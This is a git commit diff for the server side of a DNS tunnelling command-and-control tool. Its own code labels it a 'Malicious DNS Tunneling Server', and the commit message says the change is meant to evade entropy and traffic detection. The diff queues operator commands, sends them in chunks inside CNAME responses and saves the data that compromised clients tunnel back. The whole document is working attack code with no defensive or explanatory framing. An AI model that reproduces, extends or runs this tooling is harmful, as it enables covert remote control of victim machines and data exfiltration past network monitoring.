3a6edefa2b893663edae4db13f0c6a9375bf7ff9
josiah <josiahd.kitchin@gmail.com>
2026-02-23 16:17:45 -0800

    updated tunnel shell to a more robust transfer protocol, allowed to tune perameters to shorten queries and interval time to aviod entropy and traffic detection

--- attacker/dns_server.py
+++ attacker/dns_server.py
@@ -3,17 +3,17 @@ from tunnel_resolver import TunnelResolver
 from term_iface import TerminalIFace
 import queue
 import curses
+from argparse import ArgumentParser
 
-
-def main(stdscr): 
+def main(stdscr, args): 
 
     command_queue = queue.Queue()
     print_queue   = queue.Queue()
 
-    t_iface = TerminalIFace(stdscr, command_queue, print_queue)
+    t_iface = None if stdscr is None else TerminalIFace(stdscr, command_queue, print_queue)
 
     server = DNSServer(
-        TunnelResolver(command_queue, print_queue, "tunneled.txt"),
+        TunnelResolver(command_queue, print_queue, args.output, args.domain, args.chunk_size),
         logger=DNSLogger(logf=lambda s:()),
         port=53,
         address="0.0.0.0",
@@ -23,10 +23,53 @@ def main(stdscr):
     server.start_thread()
 
     try: 
-        t_iface.run()
+        if t_iface is None: 
+            server.thread.join()
+        else: 
+            t_iface.run()
     except KeyboardInterrupt: 
         pass
 
+
 if __name__ == "__main__":
-    curses.wrapper(main)
+
+    parser = ArgumentParser(description="Malicious DNS Tunneling Server")
+
+    parser.add_argument(
+        "--headless",
+        required=False,
+        help="Run the program without a TUI for debugging",
+        action="store_false"
+    )
+
+    parser.add_argument(
+        "--output", 
+        required=False,
+        help="Output file path of tunneled data",
+        default="tunneled.txt"
+    )
+
+    parser.add_argument(
+        "--domain", 
+        required=True,
+        help="Authoritiative domain owned by the server"
+    )
+
+    parser.add_argument(
+        "--chunk_size", 
+        required=False, 
+        help="Chunk size of data sent over each query. Must be greater than or equal to 2",
+        default=30
+    )
+
+    args = parser.parse_args()
+
+    chunk_size = int(args.chunk_size)
+    assert chunk_size >= 2
+    args.chunk_size = chunk_size
+
+    if args.headless: 
+        curses.wrapper(main, args)
+    else: 
+        main(None, args)
 
--- attacker/tunnel_resolver.py
+++ attacker/tunnel_resolver.py
@@ -1,22 +1,41 @@
 
 import queue 
 import base64
+from dnslib import CNAME
 from dnslib.server import BaseResolver, QTYPE, RR 
-from dnslib import TXT
 from printer_message import PrinterMessage, PrinterMessageType
 from enum import Enum
+from collections import deque
+
+def chunk_string(s: str, chunk_size: int) -> deque[str]: 
+    d = deque()
+    for i in range(0, len(s), chunk_size): 
+        d.append(s[i:i+chunk_size])
+    return d
+
 
 class TunnelMessageType(Enum): 
-    PROBE = 1
-    ACK = 2
-    FILE_START = 3
-    FILE_END = 4
+    PROBE = "P"
+    ACK = "A"
+    FILE_START = "FS"
+    FILE_END = "FE"
+    CONN = "C"
+
+class ResolverState(Enum): 
+    FILE_START = 1
+    FILE_SENDING = 2
 
 class TunnelResolver(BaseResolver):
-    def __init__(self, command_queue: queue.Queue, print_queue: queue.Queue, response_file_path: str): 
+    def __init__(self, command_queue: queue.Queue, print_queue: queue.Queue, response_file_path: str, domain: str, chunk_size: int): 
         self.command_queue = command_queue
         self.print_queue = print_queue
         self.response_file_path = response_file_path
+        self.domain = domain
+        self.state = ResolverState.FILE_START
+        self.chunked_response = deque()
+        self.last_command = ""
+        self.chunk_size = chunk_size
+
         super().__init__()
 
     def resolve(self, request, handler):
@@ -31,20 +50,44 @@ class TunnelResolver(BaseResolver):
 
             decoded = base64.urlsafe_b64decode(payload + "==").decode()
 
-            response_text = TunnelMessageType.ACK.name
+            response_text = TunnelMessageType.ACK.value
 
             # Send command if one exists on PROBE message 
             match decoded: 
-                case TunnelMessageType.PROBE.name: 
-                    # self.print_queue.put(PrinterMessage(message=decoded, message_type=PrinterMessageType.PROBE))
-                    try: 
-                        response_text = self.command_queue.get_nowait()
-                        self.print_queue.put(PrinterMessage(message=response_text, message_type=PrinterMessageType.SENT))
-                    except queue.Empty: 
-                        pass
-                case TunnelMessageType.FILE_START.name: 
+                case TunnelMessageType.CONN.value: 
+                    self.print_queue.put(PrinterMessage(message_type=PrinterMessageType.CONN))
+
+                case TunnelMessageType.PROBE.value: 
+
+                    starting_state = self.state
+
+                    if starting_state == ResolverState.FILE_START: 
+                        # Transition only if there is a command to send. Otherwise, send ACK 
+                        if not self.chunked_response:  
+                            try: 
+                                self.last_command = self.command_queue.get_nowait()
+                                self.chunked_response = chunk_string(self.last_command, self.chunk_size)
+                                self.state = ResolverState.FILE_SENDING
+                                response_text = TunnelMessageType.FILE_START.value
+                            except queue.Empty: 
+                                pass 
+
+                    elif starting_state == ResolverState.FILE_SENDING: 
+                        # Send next chunk if there is a chunk to send
+                        # Otherwise, transition back to start state and send FILE_END
+                        if self.chunked_response: 
+                            response_text = self.chunked_response.popleft()
+                        else: 
+                            self.print_queue.put(PrinterMessage(message=self.last_command, message_type=PrinterMessageType.SENT))
+                            response_text = TunnelMessageType.FILE_END.value
+                            self.state = ResolverState.FILE_START
+
+
+
+
+                case TunnelMessageType.FILE_START.value: 
                     self.print_queue.put(PrinterMessage(message=decoded, message_type=PrinterMessageType.FILE_START))
-                case TunnelMessageType.FILE_END.name: 
+                case TunnelMessageType.FILE_END.value: 
                     self.print_queue.put(PrinterMessage(message=decoded, message_type=PrinterMessageType.FILE_END))
                 case _: 
                     self.print_queue.put(PrinterMessage(message=decoded, message_type=PrinterMessageType.RECEIVED))
@@ -53,20 +96,25 @@ class TunnelResolver(BaseResolver):
 
             encoded_resp = base64.urlsafe_b64encode(
                 response_text.encode()
-            ).decode()
+            ).decode().strip("=")
+
+            resp_qname = f"{encoded_resp}.{self.domain}"
 
             reply.add_answer(
                 RR(
                     qname,
-                    QTYPE.TXT,
-                    rdata=TXT(encoded_resp),
-                    ttl=0
+                    QTYPE.CNAME,
+                    rdata=CNAME(resp_qname)
                 )
             )
+
         except Exception as e:
             self.print_queue.put(PrinterMessage(message=str(e), message_type=PrinterMessageType.ERROR))
 
         return reply
+
+
+
 
 
 
